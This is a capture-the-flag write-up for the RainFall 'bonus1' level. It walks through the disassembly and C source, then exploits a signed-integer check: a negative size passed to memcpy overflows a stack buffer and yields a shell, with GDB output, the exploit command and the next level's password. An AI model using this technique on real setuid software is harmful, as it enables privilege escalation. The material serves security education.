# bonus1

```
08048424 <main>:
 8048424:	55                   	push   ebp
 8048425:	89 e5                	mov    ebp,esp
 8048427:	83 e4 f0             	and    esp,0xfffffff0
 804842a:	83 ec 40             	sub    esp,0x40
 804842d:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048430:	83 c0 04             	add    eax,0x4
 8048433:	8b 00                	mov    eax,DWORD PTR [eax]
 8048435:	89 04 24             	mov    DWORD PTR [esp],eax
 8048438:	e8 23 ff ff ff       	call   8048360 <atoi@plt>
 804843d:	89 44 24 3c          	mov    DWORD PTR [esp+0x3c],eax
 8048441:	83 7c 24 3c 09       	cmp    DWORD PTR [esp+0x3c],0x9
 8048446:	7e 07                	jle    804844f <main+0x2b>
 8048448:	b8 01 00 00 00       	mov    eax,0x1
 804844d:	eb 54                	jmp    80484a3 <main+0x7f>
 804844f:	8b 44 24 3c          	mov    eax,DWORD PTR [esp+0x3c]
 8048453:	8d 0c 85 00 00 00 00 	lea    ecx,[eax*4+0x0]
 804845a:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804845d:	83 c0 08             	add    eax,0x8
 8048460:	8b 00                	mov    eax,DWORD PTR [eax]
 8048462:	89 c2                	mov    edx,eax
 8048464:	8d 44 24 14          	lea    eax,[esp+0x14]
 8048468:	89 4c 24 08          	mov    DWORD PTR [esp+0x8],ecx
 804846c:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 8048470:	89 04 24             	mov    DWORD PTR [esp],eax
 8048473:	e8 a8 fe ff ff       	call   8048320 <memcpy@plt>
 8048478:	81 7c 24 3c 46 4c 4f 	cmp    DWORD PTR [esp+0x3c],0x574f4c46
 804847f:	57 
 8048480:	75 1c                	jne    804849e <main+0x7a>
 8048482:	c7 44 24 08 00 00 00 	mov    DWORD PTR [esp+0x8],0x0
 8048489:	00 
 804848a:	c7 44 24 04 80 85 04 	mov    DWORD PTR [esp+0x4],0x8048580
 8048491:	08 
 8048492:	c7 04 24 83 85 04 08 	mov    DWORD PTR [esp],0x8048583
 8048499:	e8 b2 fe ff ff       	call   8048350 <execl@plt>
 804849e:	b8 00 00 00 00       	mov    eax,0x0
 80484a3:	c9                   	leave  
 80484a4:	c3                   	ret
```

```c
int main(int argc, char **argv) {
    char buffer[40];
    int value;

    value = atoi(argv[1]);
    if (value > 9) {
        return 1;
    }
    memcpy(buffer, argv[2], value * 4);
    if (value == 0x574f4c46) {
        execl("/bin/sh", "sh", NULL);
    }
    return 0;
}
```

This program is taking two parameters : the first one is parsed by libc `atoi` and stored into a variable on the stack at location `esp + 0x3c`, the second one is used as a source, and is copied into a stack allocated buffer at location `esp + 0x14` with `memcpy`. The `size` parameter of `memcpy` is the integer returned by `atoi` times 4.

There is check on `atoi` result : the number must be less or equal than **9**. This leads to a `memcpy` with a maximum size of **36**, preventing a stack overflow to occurs, because the destination buffer of `memcpy` (`esp + 0x14`) is **40** bytes in size.

Our goal is to overwrite memory location `esp + 0x3c` with the value `0x574f4c46` to get access to our shell. That is, to overwrite it from `memcpy`'s buffer with a **buffer overflow**, we must write 44 bytes ! It seems impossible since the size of the `memcpy` is capped at **36**.

But it is.

## Two's complement

This program does not check if the first argument is **negative**. Remember that computers store *signed* integers using two's complement representation. The integer `-1` is equal to `0xffffffff`.

`memcpy` takes a size as an `unsigned long` aka `size_t`, so it does not interpret the `size` argument as an signed integer. If you feed to the program `-1` as first argument, `memcpy` will try to write `0xffffffff * 4` bytes, which is `0xfffffffc` bytes. The program will **SEGFAULT** once it reach non-writable memory pages.


```
bonus1@RainFall:~$ ./bonus1 -1 foo
Segmentation fault (core dumped)
```

### Multiplication by a power of two

Maybe you are wondering why `0xffffffff * 4 = 0xfffffffc` ? First, there is an overflow, it do not fit into a 32 bits signed integer, the most significant bits are stripped. Second, we can simplify multiplication by a power of two **n** by a left bitshift of **sqrt(n)** position.
 
```
0xffffffff << 2 = 0xfffffffc <=> 0xffffffff * 4 = 0xfffffffc
```

We need to write **44** bytes. We need to find `x` such that :

```
x(twos_complement) * 4 = 44
```

## Putting it together

**44** in binary is `0b101100`. Remember that when we multiply by 4, we bitshift by 2, thus `(0b1011 << 2) == 44 == 0b101100`.

The smallest integer you can represent using two's complement with a 32-bit integer is :

```
-2147483648 (10)
0x80000000 (16)
10000000 00000000 00000000 00000000 (2)
```

Multiplying this number by 4 will make the most significant bit (or **sign** bit) overflow by 2 bit, leading to a value of **0**. But, we can set the four first bits to `1011`, so, when multiplied by 4, it will be equals to **44** !

```
10000000 00000000 00000000 00001011 (2) <=> -2147483637 (10)

<< 2 (or * 4)

00000000 00000000 00000000 00101100 (2) <=> 44 (10)
```

Quick verification under **GDB**, setting a breakpoint just before the `memcpy` call and dumping the last three value on the stack :

```
bonus1@RainFall:~$ gdb bonus1 
...
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   ...
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret    
End of assembler dump.
(gdb) b *0x08048473
Breakpoint 1 at 0x8048473
(gdb) r -2147483637 test
Starting program: /home/user/bonus1/bonus1 -2147483637 test

Breakpoint 1, 0x08048473 in main ()
(gdb) x/3wx $esp
0xbffff6e0:	0xbffff6f4	0xbffff910	0x0000002c
            [  dest  ]  [   src  ]  [  size  ]
(gdb) p/d 0x0000002c
$2 = 44
```

Then, we just need to write **40** garbage characters to fill the buffer entirely, and the magic value `0x574f4c46` that will overwrite the variable stored at location `esp + 0x3c`.

```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print("a"*40 + "\x46\x4C\x4F\x57")')
$ whoami
bonus2
$ cd ../bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
Success !